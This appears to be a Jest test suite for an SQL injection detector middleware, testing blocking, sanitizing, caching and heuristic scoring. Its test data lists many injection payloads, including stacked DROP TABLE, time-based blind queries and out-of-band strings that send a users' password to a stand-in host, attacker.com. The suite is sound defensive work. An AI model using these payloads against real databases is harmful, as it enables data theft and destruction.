/**
 * SQL Injection Detector Test Suite (Jest)
 *
 * Run with: npm test
 * or: jest sql_injection.test.js
 *
 * Install: npm install --save-dev jest
 */

const SQLInjectionDetector = require("../checks/sqlinjection.js");

describe("SQLInjectionDetector - Middleware", () => {
  let detector;
  let req, res, next;

  beforeEach(() => {
    detector = new SQLInjectionDetector();
    detector.config.heuristic.threshold = 3; // Aggressive threshold

    req = {
      body: {},
      query: {},
      params: {},
      path: "/api/test",
    };

    res = {
      status: jest.fn().mockReturnThis(),
      json: jest.fn(),
    };

    next = jest.fn();
  });

  test("should create middleware function", () => {
    const middleware = detector.middleware();
    expect(typeof middleware).toBe("function");
  });

  test("should allow safe requests", () => {
    req.body = { username: "john", email: "john@example.com" };

    const middleware = detector.middleware();
    middleware(req, res, next);

    expect(next).toHaveBeenCalled();
    expect(res.status).not.toHaveBeenCalled();
  });

  test("should block malicious requests", () => {
    req.body = { username: "admin'--", password: "test" };
    detector.config.onDetection.action = "block";

    const middleware = detector.middleware();
    middleware(req, res, next);

    expect(res.status).toHaveBeenCalledWith(403);
    expect(res.json).toHaveBeenCalled();
    expect(next).not.toHaveBeenCalled();
  });

  test("should sanitize on sanitize action", () => {
    req.body = { username: "test'value" };
    detector.config.onDetection.action = "sanitize";
    detector.config.heuristic.threshold = 1; // Low threshold to trigger

    const middleware = detector.middleware();
    middleware(req, res, next);

    expect(next).toHaveBeenCalled();
    // Body should be sanitized
  });

  test("should log on log action", () => {
    req.body = { username: "admin'--" };
    detector.config.onDetection.action = "log";

    const middleware = detector.middleware();
    middleware(req, res, next);

    expect(next).toHaveBeenCalled();
    expect(res.status).not.toHaveBeenCalled();
  });

  test("should check query parameters", () => {
    req.query = { search: "' OR '1'='1" };
    detector.config.onDetection.action = "block";

    const middleware = detector.middleware();
    middleware(req, res, next);

    expect(res.status).toHaveBeenCalledWith(403);
  });

  test("should check URL parameters", () => {
    req.params = { id: "1' OR '1'='1" };
    detector.config.onDetection.action = "block";

    const middleware = detector.middleware();
    middleware(req, res, next);

    expect(res.status).toHaveBeenCalledWith(403);
  });

  describe("SQLInjectionDetector - Configuration", () => {
    test("should load default configuration", () => {
      const detector = new SQLInjectionDetector();
      expect(detector.config.mode).toBe("bloom+heuristic");
      expect(detector.config.bloomFilter.enabled).toBe(true);
      expect(detector.config.heuristic.enabled).toBe(true);
    });

    test("should load configuration from file", () => {
      const detector = new SQLInjectionDetector("../config/sql_injection.config.js");
      expect(detector.config.mode).toBeDefined();
      expect(detector.config.heuristic).toBeDefined();
      expect(detector.config.bloomFilter).toBeDefined();
    });

    test("should handle missing config file gracefully", () => {
      const detector = new SQLInjectionDetector("./nonexistent.config.js");
      expect(detector.config.mode).toBe("bloom+heuristic"); // Falls back to default
    });

    test("should merge custom configuration", () => {
      const detector = new SQLInjectionDetector();
      expect(detector.config.heuristic.threshold).toBeGreaterThan(0);
      expect(detector.config.performance.cacheSize).toBeGreaterThan(0);
    });
  });

  describe("SQLInjectionDetector - Bloom Filter", () => {
    let detector;

    beforeEach(() => {
      detector = new SQLInjectionDetector();
    });

    test("should pass benign SQL-like text", () => {
      const result = detector.check("select from where");
      expect(result.blocked).toBe(false);
    });

    test("should detect suspicious token ratio", () => {
      const result = detector.check("malicious unknown tokens everywhere");
      const bloomResult = result.pipeline.find(
        (p) => p.stage === "Bloom Filter"
      );
      expect(bloomResult).toBeDefined();
      expect(bloomResult.suspiciousRatio).toBeDefined();
    });

    test("should add custom whitelist items", () => {
      detector._addToBloomFilter("custom_safe_word");
      expect(detector._checkBloomFilter("custom_safe_word")).toBe(true);
    });

    test("should use multiple hash functions", () => {
      expect(detector.config.bloomFilter.hashFunctions).toBeGreaterThan(0);
    });
  });

  describe("SQLInjectionDetector - Heuristic Detection", () => {
    let detector;

    beforeEach(() => {
      detector = new SQLInjectionDetector();
    });

    test("should allow safe user input", () => {
      const safeInputs = [
        "john.doe@example.com",
        "user123",
        "hello world",
        "search query",
        "normal text input",
      ];

      safeInputs.forEach((input) => {
        const result = detector.check(input);
        expect(result.blocked).toBe(false);
      });
    });

    test("should detect classic SQL injection patterns", () => {
      const maliciousInputs = [
        "' OR '1'='1",
        "admin'--",
        "' OR 1=1--",
        "1' OR '1'='1",
        "' OR 'a'='a",
      ];

      maliciousInputs.forEach((input) => {
        const result = detector.check(input);
        expect(result.blocked).toBe(true);
      });
    });

    test("should detect UNION-based attacks", () => {
      const result = detector.check("1' UNION SELECT * FROM users--");
      expect(result.blocked).toBe(true);

      const heuristicResult = result.pipeline.find(
        (p) => p.stage === "Heuristic Matching"
      );
      const unionDetection = heuristicResult.detections.find(
        (d) => d.type === "UNION Attack"
      );
      expect(unionDetection).toBeDefined();
    });

    test("should detect comment-based attacks", () => {
      const commentAttacks = ["admin'--", "test'/*comment*/", "value'#comment"];

      commentAttacks.forEach((input) => {
        const result = detector.check(input);
        expect(result.blocked).toBe(true);
      });
    });

    test("should detect stacked queries", () => {
      const result = detector.check("'; DROP TABLE users--");
      expect(result.blocked).toBe(true);

      const heuristicResult = result.pipeline.find(
        (p) => p.stage === "Heuristic Matching"
      );
      const stackedDetection = heuristicResult.detections.find(
        (d) => d.type === "Stacked Queries"
      );
      expect(stackedDetection).toBeDefined();
    });

    test("should detect encoded characters", () => {
      const encodedAttacks = [
        "%27%20OR%20%271%27%3D%271",
        "\\x27 OR 1=1",
        "%27--",
      ];

      encodedAttacks.forEach((input) => {
        const result = detector.check(input);
        expect(result.blocked).toBe(true);
      });
    });

    test("should detect hex patterns", () => {
      const result = detector.check("0x41646D696E");
      expect(result.blocked).toBe(true);
    });

    test("should detect unbalanced quotes", () => {
      const result = detector.check("test' unbalanced");
      const heuristicResult = result.pipeline.find(
        (p) => p.stage === "Heuristic Matching"
      );
      expect(heuristicResult.score).toBeGreaterThan(0);
    });

    test("should respect threshold configuration", () => {
      const detector1 = new SQLInjectionDetector();
      detector1.config.heuristic.threshold = 100; // Very high threshold

      const result = detector1.check("' OR '1'='1");
      // Might still be blocked due to high score, but threshold should be respected
      expect(result.pipeline[1].threshold).toBe(100);
    });

   
  });

  describe("SQLInjectionDetector - AST Parser", () => {
    let detector;

    beforeEach(() => {
      detector = new SQLInjectionDetector();
      detector.config.mode = "bloom+heuristic+ast";
      detector.config.astParser.enabled = true;

      // Force reload the parser
      try {
        const { Parser } = require("node-sql-parser");
        detector.parser = new Parser();
        console.log("AST parser initialized for test");
      } catch (e) {
        console.error("Cannot initialize AST parser:", e.message);
      }
    });

    test("should have AST parser available", () => {
      expect(detector.parser).toBeDefined();
      expect(detector.parser).not.toBeNull();
    });

    test("should detect multiple statements", () => {
      if (!detector.parser) {
        console.warn("Skipping - parser not available");
        return;
      }

      const result = detector.check("SELECT * FROM users; DROP TABLE users");
      expect(result.blocked).toBe(true);
    });
  });

  describe("SQLInjectionDetector - Performance", () => {
    let detector;

    beforeEach(() => {
      detector = new SQLInjectionDetector();
    });

    test("should cache results", () => {
      const input = "test input";

      const result1 = detector.check(input);
      const result2 = detector.check(input);

      expect(result2.cached).toBe(true);
      expect(detector.cache.has(input)).toBe(true);
    });

    test("should respect cache size limit", () => {
      detector.config.performance.cacheSize = 5;

      for (let i = 0; i < 10; i++) {
        detector.check(`test${i}`);
      }

      expect(detector.cache.size).toBeLessThanOrEqual(5);
    });

    test("should clear cache", () => {
      detector.check("test1");
      detector.check("test2");

      expect(detector.cache.size).toBeGreaterThan(0);

      detector.clearCache();
      expect(detector.cache.size).toBe(0);
    });

    test("should complete checks within timeout", () => {
      const result = detector.check("' OR '1'='1");
      expect(result.executionTime).toBeLessThan(
        detector.config.performance.timeout * 2
      );
    });

    test("should track execution time", () => {
      const result = detector.check("test input");
      expect(result.executionTime).toBeDefined();
      expect(result.executionTime).toBeGreaterThanOrEqual(0);
    });
  });

  describe("SQLInjectionDetector - Batch Processing", () => {
    let detector;

    beforeEach(() => {
      detector = new SQLInjectionDetector();
      detector.config.heuristic.threshold = 3; // Aggressive threshold
    });

    test("should process batch of inputs", () => {
      const inputs = [
        "safe input 1",
        "' OR '1'='1",
        "safe input 2",
        "admin'--",
      ];

      const results = detector.checkBatch(inputs);

      expect(results.length).toBe(4);
      expect(results[0].blocked).toBe(false);
      expect(results[1].blocked).toBe(true);
      expect(results[2].blocked).toBe(false);
      expect(results[3].blocked).toBe(true);
    });

    test("should handle empty batch", () => {
      const results = detector.checkBatch([]);
      expect(results.length).toBe(0);
    });

    test("should handle batch with various input types", () => {
      const inputs = [
        "normal text",
        "",
        "email@example.com",
        "'; DROP TABLE--",
      ];

      const results = detector.checkBatch(inputs);
      expect(results.length).toBe(4);
    });
  });

  describe("SQLInjectionDetector - Sanitization", () => {
    let detector;

    beforeEach(() => {
      detector = new SQLInjectionDetector();
    });

    test("should escape dangerous characters", () => {
      detector.config.onDetection.sanitizationStrategy = "escape";

      const sanitized = detector.sanitize("test'value");
      expect(sanitized).toContain("''");
    });

    test("should remove dangerous patterns", () => {
      detector.config.onDetection.sanitizationStrategy = "remove";

      const sanitized = detector.sanitize("test' OR '1'='1");
      expect(sanitized).not.toContain("'");
      expect(sanitized.toLowerCase()).not.toContain("or");
    });

    test("should encode input", () => {
      detector.config.onDetection.sanitizationStrategy = "encode";

      const sanitized = detector.sanitize("test");
      expect(sanitized).toBe(Buffer.from("test").toString("base64"));
    });
  });

  describe("SQLInjectionDetector - Statistics", () => {
    let detector;

    beforeEach(() => {
      detector = new SQLInjectionDetector();
    });

    test("should return statistics", () => {
      const stats = detector.getStats();

      expect(stats.cacheSize).toBeDefined();
      expect(stats.maxCacheSize).toBeDefined();
      expect(stats.mode).toBeDefined();
      expect(stats.config).toBeDefined();
    });

    test("should track cache size", () => {
      detector.check("input1");
      detector.check("input2");

      const stats = detector.getStats();
      expect(stats.cacheSize).toBe(2);
    });
  });

  describe("SQLInjectionDetector - Middleware", () => {
    let detector;
    let req, res, next;

    beforeEach(() => {
      detector = new SQLInjectionDetector();

      req = {
        body: {},
        query: {},
        params: {},
        path: "/api/test",
      };

      res = {
        status: jest.fn().mockReturnThis(),
        json: jest.fn(),
      };

      next = jest.fn();
    });

    test("should create middleware function", () => {
      const middleware = detector.middleware();
      expect(typeof middleware).toBe("function");
    });

    test("should allow safe requests", () => {
      req.body = { username: "john", email: "john@example.com" };

      const middleware = detector.middleware();
      middleware(req, res, next);

      expect(next).toHaveBeenCalled();
      expect(res.status).not.toHaveBeenCalled();
    });

    test("should block malicious requests", () => {
      req.body = { username: "admin'--", password: "test" };
      detector.config.onDetection.action = "block";

      const middleware = detector.middleware();
      middleware(req, res, next);

      expect(res.status).toHaveBeenCalledWith(403);
      expect(res.json).toHaveBeenCalled();
      expect(next).not.toHaveBeenCalled();
    });

    test("should sanitize on sanitize action", () => {
      req.body = { username: "test'value" };
      detector.config.onDetection.action = "sanitize";
      detector.config.heuristic.threshold = 1; // Low threshold to trigger

      const middleware = detector.middleware();
      middleware(req, res, next);

      expect(next).toHaveBeenCalled();
      // Body should be sanitized
    });

    test("should log on log action", () => {
      req.body = { username: "admin'--" };
      detector.config.onDetection.action = "log";

      const middleware = detector.middleware();
      middleware(req, res, next);

      expect(next).toHaveBeenCalled();
      expect(res.status).not.toHaveBeenCalled();
    });

    test("should check query parameters", () => {
      req.query = { search: "' OR '1'='1" };
      detector.config.onDetection.action = "block";

      const middleware = detector.middleware();
      middleware(req, res, next);

      expect(res.status).toHaveBeenCalledWith(403);
    });

    test("should check URL parameters", () => {
      req.params = { id: "1' OR '1'='1" };
      detector.config.onDetection.action = "block";

      const middleware = detector.middleware();
      middleware(req, res, next);

      expect(res.status).toHaveBeenCalledWith(403);
    });
  });

  describe("SQLInjectionDetector - Edge Cases", () => {
    let detector;

    beforeEach(() => {
      detector = new SQLInjectionDetector();
      detector.config.heuristic.threshold = 3;
    });

    test("should handle empty input", () => {
      const result = detector.check("");
      expect(result.blocked).toBe(false);
    });

    test("should handle very long input", () => {
      const longInput = "a".repeat(10000);
      const result = detector.check(longInput);
      expect(result).toBeDefined();
    });

    test("should handle special characters", () => {
      const specialChars = "!@#$%^&*()_+-={}[]|\\:\";'<>?,./~`";
      const result = detector.check(specialChars);
      expect(result).toBeDefined();
    });

    test("should handle unicode characters", () => {
      const unicode = "测试输入 тест मэдээлэл";
      const result = detector.check(unicode);
      expect(result).toBeDefined();
    });

    test("should handle null/undefined gracefully", () => {
      // Should not throw error
      expect(() => detector.check(null)).not.toThrow();
      expect(() => detector.check(undefined)).not.toThrow();

      const resultNull = detector.check(null);
      const resultUndefined = detector.check(undefined);

      expect(resultNull.blocked).toBe(false);
      expect(resultUndefined.blocked).toBe(false);
    });

    test("should handle mixed case attacks", () => {
      const mixedCase = "' Or '1'='1";
      const result = detector.check(mixedCase);
      expect(result.blocked).toBe(true);
    });

    test("should handle whitespace variations", () => {
      const withSpaces = "'    OR    '1'='1";
      const result = detector.check(withSpaces);
      expect(result.blocked).toBe(true);
    });

    test("should handle numeric inputs", () => {
      expect(() => detector.check(123)).not.toThrow();
      expect(() => detector.check(0)).not.toThrow();
    });

    test("should handle boolean inputs", () => {
      expect(() => detector.check(true)).not.toThrow();
      expect(() => detector.check(false)).not.toThrow();
    });

    test("should handle object inputs", () => {
      expect(() => detector.check({})).not.toThrow();
      expect(() => detector.check({ test: "value" })).not.toThrow();
    });
  });
});

describe("SQLInjectionDetector - Real World Test Cases", () => {
  let detector;

  beforeEach(() => {
    detector = new SQLInjectionDetector();
    detector.config.heuristic.threshold = 3;
  });

  test("should allow legitimate search queries", () => {
    const queries = [
      "how to cook pasta",
      "best laptop 2024",
      "weather forecast",
      "nodejs tutorial",
    ];

    queries.forEach((query) => {
      const result = detector.check(query);
      expect(result.blocked).toBe(false);
    });
  });

  test("should allow legitimate usernames", () => {
    const usernames = ["john_doe", "user123", "test-user", "alice.bob"];

    usernames.forEach((username) => {
      const result = detector.check(username);
      expect(result.blocked).toBe(false);
    });
  });

  test("should allow legitimate emails", () => {
    const emails = [
      "user@example.com",
      "john.doe@company.co.uk",
      "test+tag@domain.org",
    ];

    emails.forEach((email) => {
      const result = detector.check(email);
      expect(result.blocked).toBe(false);
    });
  });

  test("should block common attack vectors", () => {
    const attacks = [
      "1' OR '1'='1' --",
      "admin' /*",
      "' UNION SELECT NULL--",
      "'; DROP TABLE users; --",
      "1' AND 1=1 --",
      "' OR 'x'='x",
      "1; EXEC sp_",
      "' || (SELECT",
      "1' WAITFOR DELAY '00:00:05'--",
    ];

    attacks.forEach((attack) => {
      const result = detector.check(attack);
      expect(result.blocked).toBe(true);
    });
  });

  test("should detect time-based blind SQL injection", () => {
    const timeBasedAttacks = [
      "1' AND SLEEP(5)--",
      "'; WAITFOR DELAY '00:00:05'--",
      "1' AND BENCHMARK(1000000,MD5('A'))--",
      "1'; pg_sleep(5)--",
    ];

    timeBasedAttacks.forEach((attack) => {
      const result = detector.check(attack);
      expect(result.blocked).toBe(true);
    });
  });

  test("should detect boolean-based blind SQL injection", () => {
    const booleanAttacks = [
      "1' AND '1'='1",
      "1' AND '1'='2",
      "admin' AND 1=1--",
      "test' AND SUBSTRING(@@version,1,1)='5'--",
    ];

    booleanAttacks.forEach((attack) => {
      const result = detector.check(attack);
      expect(result.blocked).toBe(true);
    });
  });

  test("should detect error-based SQL injection", () => {
    const errorBased = [
      "' AND 1=CONVERT(int, (SELECT @@version))--",
      "' AND extractvalue(1,concat(0x7e,database()))--",
    ];

    errorBased.forEach((attack) => {
      const result = detector.check(attack);
      expect(result.blocked).toBe(true);
    });
  });

  test("should detect out-of-band SQL injection", () => {
    const outOfBand = [
      "'; EXEC master..xp_dirtree '\\\\attacker.com\\share'--",
      "' || UTL_HTTP.request('http://attacker.com/'||(SELECT password FROM users WHERE id=1))--",
    ];

    outOfBand.forEach((attack) => {
      const result = detector.check(attack);
      expect(result.blocked).toBe(true);
    });
  });

  test("should handle edge case of legitimate SQL-like content", () => {
    const legitimateSql = [
      "I want to select a color",
      "Please update my profile",
      "Delete this comment",
      "Drop me a message",
    ];

    legitimateSql.forEach((text) => {
      const result = detector.check(text);
      expect(result.blocked).toBe(false);
    });
  });

  test("should detect obfuscated attacks", () => {
    const obfuscated = [
      "admin'/**/--",
      "1'/**/UNION/**/SELECT/**/*/**/FROM/**/users--",
      "admin'--+",
      "' OR/**/1=1--",
    ];

    obfuscated.forEach((attack) => {
      const result = detector.check(attack);
      expect(result.blocked).toBe(true);
    });
  });
});

describe("SQLInjectionDetector - Performance Benchmarks", () => {
  let detector;

  beforeEach(() => {
    detector = new SQLInjectionDetector();
  });

  test("should process 1000 safe inputs quickly", () => {
    const startTime = Date.now();

    for (let i = 0; i < 1000; i++) {
      detector.check(`safe input ${i}`);
    }

    const duration = Date.now() - startTime;
    expect(duration).toBeLessThan(1000); // Should complete in under 1 second
  });

  test("should benefit from caching", () => {
    const input = "test input for caching";

    const time1Start = Date.now();
    detector.check(input);
    const time1 = Date.now() - time1Start;

    const time2Start = Date.now();
    detector.check(input);
    const time2 = Date.now() - time2Start;

    // Cached result should be faster (or at least not significantly slower)
    expect(time2).toBeLessThanOrEqual(time1 * 2);
  });
});

describe("SQLInjectionDetector - Configuration Flexibility", () => {
  test("should allow per-route configuration", () => {
    const config = require("../config/sql_injection.config.js");
    config.routes = {
      "/api/auth/login": {
        mode: "bloom+heuristic+ast",
        heuristic: { threshold: 3 },
      },
    };

    const detector = new SQLInjectionDetector();
    detector.config = config;

    const routeConfig = detector._getRouteConfig("/api/auth/login");
    expect(routeConfig.heuristic.threshold).toBe(3);
  });

  test("should support dynamic threshold adjustment", () => {
    const detector = new SQLInjectionDetector();

    // Start with lenient threshold
    detector.config.heuristic.threshold = 10;
    let result = detector.check("' OR 1=1");
    const lenientBlocked = result.blocked;

    // Switch to strict threshold
    detector.config.heuristic.threshold = 3;
    detector.clearCache(); // Clear cache to re-evaluate
    result = detector.check("' OR 1=1");
    const strictBlocked = result.blocked;

    expect(strictBlocked).toBe(true);
  });
});

describe("SQLInjectionDetector - Advanced Patterns", () => {
  let detector;

  beforeEach(() => {
    detector = new SQLInjectionDetector();
    detector.config.heuristic.threshold = 5;
  });

  test("should detect second-order SQL injection patterns", () => {
    const secondOrder = ["admin'--", "test'; --", "' + (SELECT TOP 1"];

    secondOrder.forEach((attack) => {
      const result = detector.check(attack);
      expect(result.blocked).toBe(true);
    });
  });

  test("should detect NoSQL injection attempts", () => {
    const nosqlAttacks = [
      "{'$gt': ''}",
      "{'$ne': null}",
      "'; return true; var dummy='",
    ];

    nosqlAttacks.forEach((attack) => {
      const result = detector.check(attack);
      // Some may be detected due to quotes and special chars
      expect(result).toBeDefined();
    });
  });

  test("should provide detailed detection information", () => {
    const result = detector.check("' OR 1=1-- AND UNION SELECT");

    expect(result.pipeline).toBeDefined();
    expect(result.pipeline.length).toBeGreaterThan(0);

    const heuristic = result.pipeline.find(
      (p) => p.stage === "Heuristic Matching"
    );
    expect(heuristic.detections).toBeDefined();
    expect(heuristic.score).toBeGreaterThan(0);
  });
});
